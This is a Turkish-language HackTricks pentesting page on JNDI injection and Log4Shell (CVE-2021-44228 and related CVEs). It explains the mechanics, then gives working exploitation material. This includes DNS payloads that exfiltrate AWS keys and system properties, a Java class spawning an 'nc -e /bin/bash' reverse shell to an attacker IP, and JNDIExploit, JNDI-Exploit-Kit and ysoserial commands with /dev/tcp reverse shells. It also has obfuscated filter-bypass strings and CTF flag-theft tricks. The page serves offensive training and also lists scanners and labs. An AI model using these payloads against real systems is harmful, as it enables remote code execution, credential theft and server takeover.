# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun ve daha hızlı düzeltin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Temel Bilgiler

JNDI, 1990'ların sonundan beri Java'ya entegre edilmiş olup, bir dizin hizmeti olarak hizmet verir ve Java programlarının bir adlandırma sistemi aracılığıyla veri veya nesneleri bulmasını sağlar. SPI'ler (Hizmet Sağlayıcı Arabirimleri) aracılığıyla çeşitli dizin hizmetlerini destekleyerek, uzaktaki Java nesneleri de dahil olmak üzere farklı sistemlerden veri almayı mümkün kılar. Ortak SPI'ler arasında CORBA COS, Java RMI Kayıt Defteri ve LDAP bulunur.

### JNDI Adlandırma Referansı
Java nesneleri, iki farklı formda gelen JNDI Adlandırma Referansları kullanılarak depolanabilir ve alınabilir:

- **Referans Adresleri**: Bir nesnenin konumunu (_rmi://sunucu/ref_ gibi) belirterek belirtilen adresten doğrudan alınmasını sağlar.
- **Uzak Fabrika**: Uzak bir fabrika sınıfına referans verir. Erişildiğinde, sınıf uzaktan indirilir ve örneklendirilir.

Ancak, bu mekanizma kötüye kullanılabilir ve keyfi kod yüklenmesine ve yürütülmesine yol açabilir. Bir önlem olarak:

- **RMI**: JDK 7u21'den itibaren varsayılan olarak `java.rmi.server.useCodeabseOnly = true` ile uzaktan nesne yüklemeyi kısıtlar. Bir Güvenlik Yöneticisi, yüklenebilecek şeyleri daha da sınırlar.
- **LDAP**: JDK 6u141, 7u131, 8u121'den itibaren varsayılan olarak `com.sun.jndi.ldap.object.trustURLCodebase = false` ile uzaktan yüklenen Java nesnelerinin yürütülmesini engeller. `true` olarak ayarlanırsa, Güvenlik Yöneticisi denetimi olmadan uzaktan kod yürütme mümkündür.
- **CORBA**: Belirli bir özelliği yoktur, ancak Güvenlik Yöneticisi her zaman etkindir.

Ancak, JNDI bağlantılarını çözen **Adlandırma Yöneticisi** dahili güvenlik mekanizmalarına sahip olmadığından, herhangi bir kaynaktan nesnelerin alınmasına izin verebilir. Bu, RMI, LDAP ve CORBA korumalarının atlatılmasına ve keyfi Java nesnelerinin yüklenmesine veya mevcut uygulama bileşenlerinin (gadget'lar) kötü amaçlı kod çalıştırmasına yol açabilir.

Sömürülebilen URL örnekleri şunları içerir:
- _rmi://saldırgan-sunucu/bar_
- _ldap://saldırgan-sunucu/bar_
- _iiop://saldırgan-sunucu/bar_

Koruma önlemlerine rağmen, yüklenmemiş kaynaklardan JNDI'nın alınmasına karşı koruma eksikliği ve mevcut korumaların atlatılma olasılığı nedeniyle güvenlik açıkları devam etmektedir.


### JNDI Örneği

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Bir **`PROVIDER_URL`** ayarlamış olsanız bile, bir arama sırasında farklı bir URL belirtebilir ve erişilebilir: `ctx.lookup("<saldırgan-kontrollü-url>")` ve bu, bir saldırganın kendi kontrolünde olan bir sistemden keyfi nesneleri yüklemek için istismar edeceği şeydir.

### CORBA Genel Bakış

CORBA (Common Object Request Broker Architecture), uzaktaki nesneleri benzersiz bir şekilde tanımlamak için **Uyumluluk Sağlayan Nesne Referansı (IOR)** kullanır. Bu referans, tür kimliği ve stub sınıfını elde etmek için URL gibi temel bilgileri içerir.

Özellikle, CORBA temel olarak savunmasız değildir. Güvenliği sağlamak genellikle şunları içerir:

- Bir **Güvenlik Yöneticisi**nin kurulumu.
- Güvenlik Yöneticisinin potansiyel olarak zararlı kod tabanlarına bağlantılara izin vermesi için yapılandırılması. Bunun için şunlar yapılabilir:
- Soket izni, örneğin ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Dosya okuma izinleri, evrensel olarak (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) veya kötü amaçlı dosyaların yerleştirilebileceği belirli dizinler için.

Ancak, bazı satıcı politikaları hoşgörülü olabilir ve bunlara varsayılan olarak izin verebilir.

### RMI Bağlamı

RMI (Uzak Yöntem Çağrısı) için durum biraz farklıdır. CORBA ile benzer şekilde, keyfi sınıf indirme varsayılan olarak kısıtlanmıştır. RMI'yi istismar etmek için genellikle Güvenlik Yöneticisini atlatmak gerekmektedir, bu da CORBA için de geçerli olan bir başarıdır.

### LDAP

İlk olarak, bir Arama ve Bir Bakış arasında ayrım yapmamız gerekiyor.\
Bir **arama**, `ldap://localhost:389/o=JNDITutorial` gibi bir URL kullanarak bir LDAP sunucusundan JNDITutorial nesnesini bulmak ve **özniteliklerini almak** için kullanılır.\
Bir **bakış**, **adlandırma hizmetleri** için kullanılır, çünkü bir **isme bağlı olan herhangi bir şeyi** almak istiyoruz.

LDAP araması, **SearchControls.setReturningObjFlag()** ile `true` olarak çağrıldıysa, döndürülen nesne yeniden oluşturulur.

Bu nedenle, bu seçeneklere saldırmak için birkaç yol vardır.\
Bir saldırgan, LDAP kayıtlarını zehirleyerek üzerlerine yürütülecek payloadları tanıtabilir (LDAP sunucusuna erişiminiz varsa onlarca makineyi tehlikeye atmak için çok kullanışlıdır). Bunun yanı sıra, örneğin bir LDAP aramasında bir **MitM saldırısı** gerçekleştirebilirsiniz.

Bir uygulamanın bir JNDI LDAP URL'sini çözmesini sağlayabilirseniz, aranacak LDAP'yi kontrol edebilir ve istismarı geri gönderebilirsin
## Log4Shell Zafiyeti

Bu zafiyet, Log4j'de desteklenen özel bir sözdizimine dayanır. Sözdizimi `${prefix:name}` şeklindedir, burada `prefix`, `name` değerinin değerlendirilmesi gereken çeşitli [Arama](https://logging.apache.org/log4j/2.x/manual/lookups.html) türlerinden biridir. Örneğin, `${java:version}` Java'nın mevcut çalışan sürümüdür.

[LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313), `jndi` Arama özelliğini tanıttı. Bu özellik, değişkenlerin JNDI aracılığıyla alınmasını sağlar. Genellikle, anahtar otomatik olarak `java:comp/env/` ile öneklenir. Ancak, anahtarın kendisi **":"** içeriyorsa, bu varsayılan önek uygulanmaz.

Anahtarın içinde **":"** bulunan `${jndi:ldap://example.com/a}` gibi durumlarda **önek yoktur** ve **LDAP sunucusu nesne için sorgulanır**. Bu Aramalar, Log4j'nin yapılandırmasında ve satırlar kaydedilirken kullanılabilir.

Bu nedenle, yalnızca **kullanıcı tarafından kontrol edilen bilgileri işleyen Log4j'nin güvenlik açığına sahip bir sürümüne ihtiyaç vardır**. Ve bu, Java uygulamaları tarafından (İnternete açık uygulamalar dahil) bilgi kaydetmek için yaygın olarak kullanılan bir kütüphanedir. Ancak, log4j yalnızca HTTP bilgilerini değil, geliştiricinin belirttiği herhangi bir girişi ve veriyi kaydetmek için kullanılır.

## Log4Shell ile İlgili CVE'lerin Genel Bakışı

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Kritik]**
Bu zafiyet, 2.0-beta9'dan 2.14.1'e kadar olan sürümleri etkileyen `log4j-core` bileşeninde kritik bir **güvenilmeyen serileştirme hatası**dır. Sistemlerin ele geçirilmesine izin veren **uzaktan kod yürütme (RCE)** sağlar. Sorun, Alibaba Cloud Güvenlik Ekibi'nden Chen Zhaojun tarafından bildirildi ve çeşitli Apache çerçevelerini etkiler. 2.15.0 sürümündeki ilk düzeltme eksikti. Savunma için Sigma kuralları mevcuttur ([Kural 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Kural 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Kritik]**
Başlangıçta düşük olarak derecelendirilen ancak daha sonra kritik olarak yükseltilen bu CVE, 2.15.0 sürümünde CVE-2021-44228 için eksik bir düzeltmeden kaynaklanan bir **Hizmet Reddi (DoS)** hatasıdır. Varsayılan olmayan yapılandırmaları etkiler ve saldırganların oluşturulmuş yükler aracılığıyla DoS saldırılarına neden olmasına izin verir. Bir [tweet](https://twitter.com/marcioalm/status/1471740771581652995) bir atlatma yöntemini sergilemektedir. Sorun, mesaj arama desenlerini kaldırarak ve JNDI'yi varsayılan olarak devre dışı bırakarak 2.16.0 ve 2.12.2 sürümlerinde çözülmüştür.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Yüksek]**
`JMSAppender` kullanarak varsayılan olmayan yapılandırmalarda etkili olan **Log4j 1.x sürümlerini** etkileyen bu CVE, güvenilmeyen serileştirme hatasıdır. 1.x dalı için mevcut bir düzeltme bulunmamaktadır ve `log4j-core 2.17.0`'a yükseltme önerilir.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Orta]**
Bu zafiyet, Log4j 1.x'in halefi olan Logback günlükleme çerçevesini etkiler. Daha önce güvenli olduğu düşünülen çerçeve, savunmasız bulundu ve sorunu çözmek için yeni sürümler (1.3.0-alpha11 ve 1.2.9) yayınlandı.

### **CVE-2021-45105** **[Yüksek]**
Log4j 2.16.0, bir Hizmet Reddi (DoS) hatası içerir ve CVE'yi düzeltmek için `log4j 2.17.0` sürümünün yayınlanmasını gerektirir. Daha fazla ayrıntı BleepingComputer'ın [raporunda](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) bulunmaktadır.

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Log4j 2.17 sürümünü etkileyen bu CVE, saldırganın log4j'nin yapılandırma dosyasını kontrol etmesini gerektirir. Yapılandırılmış bir JDBCAppender aracılığıyla potansiyel keyfi kod yürütme içerir. Daha fazla ayrıntı [Checkmarx blog yazısında](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) bulunabilir.


## Log4Shell Sömürüsü

### Keşif

Bu zafiyet, korumasızsa keşfi çok kolaydır çünkü en azından payloadunuzda belirttiğiniz adrese bir **DNS isteği** gönderir. Bu nedenle, aşağıdaki gibi payloadlar:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` ([canarytokens.com](https://canarytokens.org/generate) kullanarak)
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` ([interactsh](https://github.com/projectdiscovery/interactsh) kullanarak)
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (Burp Suite kullanarak)
* `${jndi:ldap://2j4ayo.dnslog.cn}` ([dnslog](http://dnslog.cn) kullanarak)
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` ([huntress](https://log4shell.huntress.com) kullanarak)

**Bir DNS isteği alınsa bile, bu uygulamanın sömürülebilir** (veya hatta savunmasız) olduğu anlamına gelmez, sömürmeyi denemeniz gerekecektir.

{% hint style="info" %}
2.15 sürümünü **sömürmek için localhost kontrolünü atlamak** için ${jndi:ldap://**127.0.0.1#**...} eklemeniz gerektiğini unutmayın.
{% endhint %}

#### **Yerel Keşif**

Aşağıdaki komutla **yerel savunmasız sürümleri** arayın:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Doğrulama**

Önceden listelenen bazı platformlar, istendiğinde kaydedilecek olan değişken verileri eklemenize izin verecektir.\
Bu, 2 şey için çok faydalı olabilir:

* Zafiyeti **doğrulamak** için
* Zafiyeti istismar ederek bilgi **sızdırmak** için

Örneğin, şunu isteyebilirsiniz:\
veya `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** ve eğer bir **DNS isteği, ortam değişkeninin değeriyle birlikte alınırsa**, uygulamanın zafiyete sahip olduğunu bilirsiniz.

Sızdırmaya çalışabileceğiniz diğer bilgiler:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Bilgisi

{% hint style="info" %}
JDK sürümleri 6u141, 7u131 veya 8u121'den daha yeni olan sunucular, LDAP sınıf yükleme saldırı vektörüne karşı korunmaktadır. Bu, `com.sun.jndi.ldap.object.trustURLCodebase` varsayılan olarak devre dışı olduğu için JNDI'nin LDAP aracılığıyla uzaktan bir kod tabanını yüklemesini engeller. Bununla birlikte, bu sürümlerin **serileştirme saldırı vektörüne karşı korunmadığı** önemli bir noktadır.

Bu daha yeni JDK sürümlerini sömürmeyi amaçlayan saldırganlar, Java uygulaması içinde bir **güvenilir araç** kullanmak zorundadır. Bu amaçla genellikle ysoserial veya JNDIExploit gibi araçlar kullanılır. Öte yandan, daha eski JDK sürümlerini sömürmek nispeten daha kolaydır çünkü bu sürümler, keyfi sınıfları yüklemek ve yürütmek için manipüle edilebilir.

**Daha fazla bilgi** (_RMI ve CORBA vektörlerindeki sınırlamalar gibi_) **önceki JNDI Naming Referans bölümünü** veya [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) kontrol edin.
{% endhint %}

### RCE - Özel yük ile Marshalsec

Bu işlemi **THM kutusunda** test edebilirsiniz: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

[**marshalsec**](https://github.com/mbechler/marshalsec) aracını kullanın (jar sürümü [**burada**](https://github.com/RandomRobbieBF/marshalsec-jar) mevcuttur). Bu yaklaşım, bağlantıları ikincil bir HTTP sunucusuna yönlendiren bir LDAP yönlendirme sunucusu oluşturur ve saldırının barındırılacağı yer burasıdır:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Hedefin ters kabuk kodunu yüklemesi için, aşağıdaki içeriğe sahip `Exploit.java` adında bir Java dosyası oluşturun:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Java dosyasını bir sınıf dosyasına derlemek için şunu kullanın: `javac Exploit.java -source 8 -target 8`. Ardından, sınıf dosyasını içeren dizinde bir **HTTP sunucusu** başlatmak için şunu kullanın: `python3 -m http.server`. **marshalsec LDAP sunucusunun** bu HTTP sunucusuna referans verdiğinden emin olun.

Hassas web sunucusunda exploit sınıfının çalıştırılmasını tetiklemek için aşağıdaki gibi bir payload gönderin:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Not:** Bu saldırı, Java'nın LDAP aracılığıyla uzaktan kod tabanı yükleme izin veren yapılandırmasına dayanmaktadır. Bu izin verilmiyorsa, keyfi kod yürütme için güvenilir bir sınıfı sömürmeyi düşünebilirsiniz.


### RCE - **JNDIExploit**

{% hint style="info" %}
Yazar, log4shell'in keşfinden sonra bu projeyi github'dan kaldırmıştır. [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) adresinde önbelleğe alınmış bir sürüm bulabilirsiniz, ancak yazarın kararına saygı duymak isterseniz bu zafiyeti sömürmek için farklı bir yöntem kullanın.

Ayrıca, kaynak kodunu wayback machine'de bulamazsınız, bu yüzden ya kaynak kodunu analiz edin ya da ne yürüttüğünüzü bilmediğiniz bir jar dosyasını çalıştırın.
{% endhint %}

Bu örnekte, log4shell'in güvenlik açığına sahip bir **zayıf web sunucusunu** 8080 numaralı bağlantı noktasında çalıştırabilirsiniz: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README dosyasında nasıl çalıştırılacağını bulabilirsiniz_). Bu zayıf uygulama, HTTP isteği başlığı _X-Api-Version_ içeriğini log4shell'in güvenlik açığına sahip bir sürümüyle kaydetmektedir.

Ardından, **JNDIExploit** jar dosyasını indirebilir ve aşağıdaki komutla çalıştırabilirsiniz:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Kodları sadece birkaç dakika okuduktan sonra, _com.feihong.ldap.LdapServer_ ve _com.feihong.ldap.HTTPServer_ içinde **LDAP ve HTTP sunucularının nasıl oluşturulduğunu** görebilirsiniz. LDAP sunucusu, hangi payload'ın sunulması gerektiğini anlayacak ve kurbanı HTTP sunucusuna yönlendirecek, bu sunucu ise saldırıyı gerçekleştirecektir.\
_com.feihong.ldap.gadgets_ içinde, istenen eylemi gerçekleştirmek için kullanılabilecek **bazı özel araçları** bulabilirsiniz (potansiyel olarak keyfi kod yürütebilir). Ve _com.feihong.ldap.template_ içinde, saldırıları **oluşturacak farklı şablon sınıflarını** görebilirsiniz.

Tüm mevcut saldırıları **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** komutuyla görebilirsiniz. Bazı faydalı olanlar:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Öyleyse, örneğimizde zaten çalışan bu zafiyetli docker uygulamasını ele geçirmek için:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Saldırıları gönderirken, **JNDIExploit-1.2-SNAPSHOT.jar**'ı çalıştırdığınız terminalde bazı çıktılar göreceksiniz.

Diğer saldırı seçeneklerini kontrol etmek için `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` komutunu kontrol etmeyi unutmayın. Ayrıca, ihtiyaç duyarsanız, LDAP ve HTTP sunucularının bağlantı noktasını değiştirebilirsiniz.

### Uzaktan Kod Çalıştırma (RCE) - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Önceki saldırıya benzer şekilde, bu zafiyeti sömürmek için [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) kullanmayı deneyebilirsiniz.\
Kurban kişiye göndermek için URL'leri oluşturabilirsiniz:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Bu saldırı, **THM solar odası** gibi laboratuvarlarda çalışacaktır. Ancak, genel olarak çalışmayacaktır (çünkü varsayılan olarak Java, LDAP kullanarak uzak kod tabanını yüklemeye yapılandırılmamıştır) çünkü güvenilen bir sınıfı kötüye kullanarak keyfi kodu yürütmüyor gibi görünüyor._

### RCE - ysoserial ve JNDI-Exploit-Kit

Bu seçenek, **yalnızca belirli sınıflara güvenen Java sürümlerini hedeflemek için gerçekten kullanışlıdır**. Bu nedenle, **ysoserial**, **güvenilen sınıfların seri hale getirilmesini** üretebilmek için kullanılacak ve bu seri hale getirilmiş sınıflar, keyfi kodu **yürütmek için kullanılabilir** (_ysoserial tarafından kötüye kullanılan güvenilen sınıf, saldırının çalışması için kurban Java programı tarafından kullanılmalıdır_).

**ysoserial** veya [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) kullanarak JNDI tarafından indirilecek seri hale getirme saldırısını oluşturabilirsiniz:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) kullanarak, saldırı bekleyen zafiyetli makinelerden gelen bağlantıları bekleyen **JNDI bağlantıları** oluşturun. JNDI-Exploit-Kit tarafından otomatik olarak oluşturulan **farklı saldırılar** veya kendi oluşturduğunuz veya ysoserial tarafından oluşturulan **deserializasyon payloadları** ile hizmet verebilirsiniz.
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Artık zafiyeti sömürmek ve bir ters kabuk elde etmek için oluşturulan bir JNDI bağlantısını kolayca kullanabilirsiniz: **`${ldap://10.10.14.10:1389/generated}`**. Bu bağlantıyı, log4j'ın zafiyete açık bir sürümüne göndererek ters kabuk elde edebilirsiniz.

### Atlamalar
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### Otomatik Tarama Araçları

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Yerel savunmasız kütüphaneleri bulur

### Test için Lablar

* [**LogForge HTB makinesi**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar odası**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell Sömürü Sonrası

Bu [**CTF yazısı**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) Log4J'nin bazı özelliklerinin potansiyel olarak **kötüye kullanılmasının mümkün olduğunu** iyi bir şekilde açıklamaktadır.

Log4j'nin [**güvenlik sayfası**](https://logging.apache.org/log4j/2.x/security.html) bazı ilginç cümleler içermektedir:

> Sürüm 2.16.0'dan itibaren (Java 8 için), **mesaj arama özelliği tamamen kaldırılmıştır**. **Yapılandırmadaki aramalar hala çalışır**. Ayrıca, Log4j artık JNDI erişimini varsayılan olarak devre dışı bırakır. Yapılandırmadaki JNDI aramaları artık açıkça etkinleştirilmelidir.

> Sürüm 2.17.0'den itibaren (ve Java 7 ve Java 6 için 2.12.3 ve 2.3.1), **yalnızca yapılandırmadaki arama dizeleri özyinelemeli olarak genişletilir**; diğer herhangi bir kullanımda, yalnızca en üst düzey arama çözülür ve herhangi bir iç içe arama çözülmez.

Bu, varsayılan olarak herhangi bir `jndi` saldırısı yapamayacağınız anlamına gelir. Dahası, özyinelemeli aramaları gerçekleştirmek için bunları yapılandırmanız gerekmektedir.

Örneğin, bu CTF'de log4j2.xml dosyasında bunun yapılandırıldığı gibi:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

Bu CTF'de saldırgan `${sys:cmd}` değerini kontrol ediyordu ve bir ortam değişkeninden bayrağı çıkarması gerekiyordu. Bu sayfada [**önceki payloadlarda**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) olduğu gibi, **`${env:FLAG}`** gibi farklı yollarla ortam değişkenlerine erişmek mümkündür. Bu CTF'de bu işe yaramadı, ancak başka gerçek hayat senaryolarında işe yarayabilir.

### Exceptions ile Veri Çalma

CTF'de, log4J kullanarak java uygulamasının stderr'ine erişemediniz, ancak Log4J **istisnaları stdout'a gönderilir**, bu da python uygulamasında yazdırılır. Bu, bir istisna tetikleyerek içeriğe erişebileceğimiz anlamına gelir. Bayrağı çalmak için bir istisna: **`${java:${env:FLAG}}`.** Bu çalışır çünkü **`${java:CTF{blahblah}}`** mevcut değil ve bayrağın değeriyle bir istisna gösterilecektir:

![](<../../.gitbook/assets/image (157).png>)

### Dönüşüm Desenleri İstisnaları

Sadece bahsetmek için, yeni [**dönüşüm desenleri**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) enjekte edebilir ve `stdout`'a kaydedilen istisnaları tetikleyebilirsiniz. Örneğin:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Bu, hata mesajının içindeki tarihi çalmak için yararlı bulunmadı, çünkü dönüşüm deseninden önce arama çözülmedi, ancak tespit etmek gibi diğer şeyler için kullanışlı olabilir.

### Dönüşüm Desenleri Regexleri

Ancak, regexleri destekleyen bazı **dönüşüm desenleri** kullanarak bir arama sırasında bilgi çalmak mümkündür ve **ikili arama** veya **zamana dayalı** davranışları kötüye kullanabilirsiniz.

* **İstisna mesajları aracılığıyla ikili arama**

**`%replace`** dönüşüm deseni, bir **diziden içeriği** **regexler** kullanarak **değiştirmek** için kullanılabilir. Şu şekilde çalışır: `replace{pattern}{regex}{substitution}`\
Bu davranışı kötüye kullanarak, regex'in dize içinde herhangi bir şeyle eşleştiğinde **bir istisna tetikleyebilir** (eğer bulunamazsa istisna tetiklenmez) örneğin:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Zaman tabanlı**

Önceki bölümde belirtildiği gibi, **`%replace`** **regexleri** destekler. Bu nedenle, bayrağın bulunduğu durumda bir **zaman aşımı** oluşturmak için [**ReDoS sayfasındaki**](../regular-expression-denial-of-service-redos.md) payload kullanılabilir.\
